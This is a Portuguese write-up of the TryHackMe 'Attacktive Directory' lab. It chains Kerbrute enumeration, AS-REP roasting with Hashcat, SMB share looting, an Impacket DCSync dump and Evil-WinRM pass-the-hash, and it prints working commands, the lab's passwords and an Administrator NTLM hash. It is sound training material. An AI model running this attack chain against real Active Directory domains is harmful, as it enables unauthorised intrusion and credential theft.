# TryHackMe — Attacktive Directory

**Categoria:** Active Directory  
**Dificuldade:** Easy  
**Plataforma:** TryHackMe  
**Foco:** Active Directory Enumeration, Kerberos, SMB, AS-REP Roasting, NTDS.dit e Pass-the-Hash.

---

## 1. Introdução

O laboratório **Attacktive Directory**, do TryHackMe, apresenta um ambiente Windows com Active Directory, permitindo explorar técnicas comuns de reconhecimento, enumeração e obtenção de credenciais em um domínio corporativo.

O objetivo é identificar informações sobre o domínio, enumerar usuários, explorar configurações relacionadas ao Kerberos, localizar credenciais em compartilhamentos SMB e, posteriormente, obter acesso privilegiado ao ambiente.

Durante a exploração, foram utilizadas ferramentas como:

- Nmap
- Kerbrute
- Impacket
- Hashcat
- SMBClient
- Evil-WinRM

> **Aviso:** Este write-up documenta um laboratório educacional. Todas as técnicas foram executadas no ambiente autorizado do TryHackMe.

---

# 2. Active Directory Enumeration

A primeira etapa consiste no reconhecimento do alvo e na identificação dos serviços disponíveis.

### 2.1. Enumeração de SMB

Inicialmente, foi necessário identificar os serviços SMB expostos pelo servidor, especialmente as portas TCP 139 e 445.

**Questão 1 — What tool will allow us to enumerate port 139/445?**

Ferramenta utilizada: `Nmap`.

Exemplo de comando:

```bash
nmap -p 139,445 -sV -sC <IP>
```

O objetivo é identificar os serviços em execução, suas versões e possíveis informações relacionadas ao SMB.

**Evidências:**

![Enumeração SMB](images/smb-enumeration.png)

### 2.2. Identificação do domínio

Durante a enumeração, foram coletadas informações sobre o ambiente Windows e o domínio do Active Directory.

**Questão 2 — What is the NetBIOS-Domain Name of the machine?**

Resultado: `SPOOKYSEC`

**Questão 3 — What invalid TLD do people commonly use for their Active Directory Domain?**

Resultado: `.local`

O sufixo `.local` é frequentemente encontrado em ambientes Active Directory, embora não seja um TLD público convencional.

---

# 3. Kerberos Enumeration

Após identificar o ambiente Active Directory, o próximo passo foi enumerar contas de usuários utilizando o protocolo Kerberos.

O Kerberos é um protocolo de autenticação baseado em tickets. Em ambientes Active Directory, ele pode fornecer informações importantes sobre usuários e configurações de autenticação.

### 3.1. Enumeração de usuários com Kerbrute

O Kerbrute permite identificar usuários válidos no domínio por meio de requisições Kerberos.

**Questão 1 — What command within Kerbrute will allow us to enumerate valid usernames?**

O subcomando utilizado é:

```bash
kerbrute userenum
```

Exemplo:

```bash
kerbrute userenum --dc <IP> -d spookysec.local users.txt
```

**Questões 2 e 3 — What notable accounts are discovered?**

Durante a enumeração, foram identificadas contas relevantes para as próximas etapas da exploração.

- `svc-admin`
- `backup`

Essas contas merecem atenção porque podem apresentar configurações ou permissões que permitam avançar na exploração do domínio.

---

# 4. Abusing Kerberos — AS-REP Roasting

Uma das contas identificadas apresentou uma configuração interessante relacionada à pré-autenticação Kerberos.

O ataque **AS-REP Roasting** explora contas que possuem a pré-autenticação Kerberos desabilitada. Nessa situação, um atacante pode solicitar uma resposta AS-REP ao KDC sem conhecer previamente a senha do usuário.

Essa resposta contém material criptográfico que pode ser submetido a ataques offline de força bruta ou dicionário.

### 4.1. Identificação da conta vulnerável

**Questão 1 — Which user account can you query a ticket from with no password?**

Conta identificada: `svc-admin`.

### 4.2. Identificação do hash Kerberos

A resposta AS-REP obtida utiliza o formato:

`$krb5asrep$23$`

**Questão 2 — What type of Kerberos hash did we retrieve from the KDC?**

Consulte a documentação oficial do Hashcat:

https://hashcat.net/wiki/doku.php?id=example_hashes

Tipo: Kerberos 5, etype 23, AS-REP.

**Questão 3 — What mode is the hash?**

Modo do Hashcat:

```text
18200
```

### 4.3. Quebra do hash

Com o hash obtido, foi realizado um ataque offline utilizando o Hashcat e a lista de senhas modificada disponibilizada pelo laboratório.

Exemplo:

```bash
hashcat -m 18200 hash.txt wordlist.txt
```

**Questão 4 — What is the user account's password?**

Credencial recuperada:

| Usuário | Senha |
|---|---|
| svc-admin | `management2005` |

A obtenção dessa senha permitiu avançar para a enumeração autenticada do ambiente.

---

# 5. SMB Enumeration

Com as credenciais de `svc-admin`, foi possível realizar novas consultas aos serviços SMB.

O SMB permite compartilhamento de arquivos e recursos em redes Windows. Dependendo das permissões configuradas, determinados compartilhamentos podem estar acessíveis a usuários comuns ou contas específicas.

### 5.1. Identificação dos compartilhamentos

**Questão 1 — What utility can we use to map remote SMB shares?**

Ferramenta: `smbclient`.

**Questão 2 — Which option will list shares?**

A opção utilizada para listar os compartilhamentos é:

```bash
-L
```

Exemplo:

```bash
smbclient -L //<IP> -U 'SPOOKYSEC.LOCAL\svc-admin'
```

**Questão 3 — How many remote shares is the server listing?**

Foram identificados cinco compartilhamentos:

- ADMIN$
- backup
- C$
- IPC$
- NETLOGON
- SYSVOL

*Observação: a listagem acima contém seis nomes; a contagem deve considerar exatamente o resultado exibido pelo servidor.*

### 5.2. Acesso ao compartilhamento

**Questão 4 — Which share contains a text file that we can access?**

Compartilhamento identificado: `backup`.

Acesso:

```bash
smbclient //<IP>/backup -U 'SPOOKYSEC.LOCAL\svc-admin'
```

Após autenticar, foi realizada a listagem dos arquivos:

```text
ls
```

### 5.3. Download do arquivo

**Questão 5 — What is the content of the file?**

O arquivo encontrado foi baixado utilizando o comando:

```text
get backup_credentials.txt
```

### 5.4. Decodificação Base64

**Questão 6 — Decoding the contents of the file, what is the full contents?**

O conteúdo estava codificado em Base64.

Para decodificar:

```bash
base64 -d backup_credentials.txt
```

Resultado:

```text
backup@spookysec.local:backup2517860
```

Novas credenciais foram obtidas:

| Usuário | Senha |
|---|---|
| backup | `backup2517860` |

Essa descoberta permitiu avançar para a etapa de extração dos hashes do domínio.

---

# 6. Domain Privilege Escalation

Nesta etapa, o objetivo foi utilizar as credenciais recuperadas para obter informações sensíveis armazenadas no Active Directory.

### 6.1. Verificação de privilégios

Antes de executar a extração, é importante compreender quais permissões a conta possui e se ela pode realizar operações de replicação do diretório.

A conta `backup` apresentou permissões suficientes para obter informações sensíveis do domínio utilizando o método DRSUAPI.

**Evidência:**

![Verificação de privilégios](images/privilege-verification.png)

### 6.2. Extração dos hashes com Impacket

**Questão 1 — What method allowed us to dump NTDS.DIT?**

Foi utilizada a ferramenta `secretsdump.py`, do conjunto Impacket.

Comando:

```bash
impacket-secretsdump spookysec.local/backup:<PASSWORD>@<IP>
```

O método utilizado foi:

**DRSUAPI (Directory Replication Service Remote Protocol)**.

Esse método permite obter informações de credenciais por meio da replicação do Active Directory, explorando permissões de replicação adequadas.

A operação é frequentemente associada à técnica conhecida como **DCSync**.

### 6.3. Obtendo o NTLM Hash do Administrator

**Questão 2 — What is the Administrator's NTLM hash?**

Durante a execução do `secretsdump`, foi retornada a seguinte entrada:

```text
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
```

Interpretando os campos:

| Campo | Significado |
|---|---|
| Administrator | Nome da conta |
| 500 | RID da conta Administrator |
| aad3... | LM Hash |
| 0e036... | NTLM Hash |

**NTLM Hash do Administrator:**

```text
0e0363213e37b94221497260b0bcb4fc
```

Embora a ferramenta tenha apresentado posteriormente um erro de espaço em disco, o hash da conta Administrator já havia sido retornado.

---

# 7. Pass-the-Hash

**Questão 3 — What method of attack could allow us to authenticate as the user without the password?**

A técnica utilizada é conhecida como **Pass-the-Hash (PtH)**.

O Pass-the-Hash permite autenticar-se em determinados serviços Windows utilizando diretamente um hash NTLM, sem precisar recuperar a senha original em texto puro.

Nesse cenário, o hash NTLM da conta Administrator obtido anteriormente pode ser utilizado para autenticação.

---

# 8. Evil-WinRM

O Evil-WinRM é uma ferramenta utilizada para interagir remotamente com sistemas Windows por meio do Windows Remote Management (WinRM).

**Questão 4 — Using a tool called Evil-WinRM what option will allow us to use a hash?**

A opção utilizada para autenticação por hash é:

```text
-H
```

Exemplo:

```bash
evil-winrm -i <IP> -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
```

Essa técnica permite utilizar o hash NTLM recuperado anteriormente para tentar estabelecer uma sessão remota.

---

# 9. Flag Submission Panel

Após obter acesso ao ambiente, as flags do laboratório podem ser localizadas nos diretórios Desktop dos respectivos usuários.

É importante verificar os diretórios disponíveis e identificar os arquivos de flag correspondentes aos objetivos da sala.

---

# 10. Conclusão

O laboratório Attacktive Directory demonstrou como diferentes técnicas de enumeração e exploração podem ser encadeadas para comprometer um ambiente Active Directory.

Durante a atividade, foram praticados:

- Reconhecimento de serviços SMB.
- Enumeração de usuários com Kerbrute.
- Identificação de configurações vulneráveis do Kerberos.
- AS-REP Roasting.
- Quebra offline de hashes com Hashcat.
- Enumeração de compartilhamentos SMB.
- Recuperação de credenciais armazenadas em arquivos.
- Extração de hashes do Active Directory com Impacket.
- Técnica DCSync utilizando DRSUAPI.
- Autenticação Pass-the-Hash.
- Acesso remoto com Evil-WinRM.

**Principal aprendizado:** a segurança de um domínio Active Directory depende não apenas de senhas fortes, mas também de configurações adequadas de autenticação, permissões de usuários, compartilhamentos e privilégios de replicação.
